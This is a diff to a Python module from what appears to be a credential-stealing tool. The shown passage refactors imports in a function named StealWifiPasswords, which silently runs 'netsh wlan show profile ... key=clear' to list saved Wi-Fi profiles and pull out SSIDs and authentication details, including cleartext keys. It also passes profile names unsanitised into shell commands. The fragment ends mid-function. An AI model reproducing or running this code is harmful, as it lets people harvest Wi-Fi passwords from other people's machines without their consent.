@@ -1,7 +1,7 @@
 # Import modules
 
 import re 
-from subprocess import check_output, DEVNULL
+import subprocess
 
 
 # Get wifi auth credentials
@@ -9,11 +9,13 @@ from subprocess import check_output, DEVNULL
 def StealWifiPasswords():
 	Result = []
 	Chcp = 'chcp 65001 && '
-	Networks = check_output(f'{Chcp}netsh wlan show profile', shell=True, stderr=DEVNULL, stdin=DEVNULL)
+	Networks = subprocess.check_output(f'{Chcp}netsh wlan show profile',
+		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 	Networks = Networks.decode(encoding='utf-8', errors='strict')
 	NetworkNamesList = re.findall('(?:Profile\\s*:\\s)(.*)', Networks) 
 	for NetworkName in NetworkNamesList:
-		CurrentResult = check_output(f'{Chcp}netsh wlan show profile {NetworkName} key=clear', shell=True, stderr=DEVNULL, stdin=DEVNULL)
+		CurrentResult = subprocess.check_output(f'{Chcp}netsh wlan show profile {NetworkName} key=clear',
+			shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 		CurrentResult = CurrentResult.decode(encoding='utf-8', errors='strict')        
 		SSID = re.findall('(?:SSID name\\s*:\\s)(.*)', str(CurrentResult))[0].replace('\r', '').replace("\"", '')
 		Authentication = re.findall(r'(?:Authentication\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
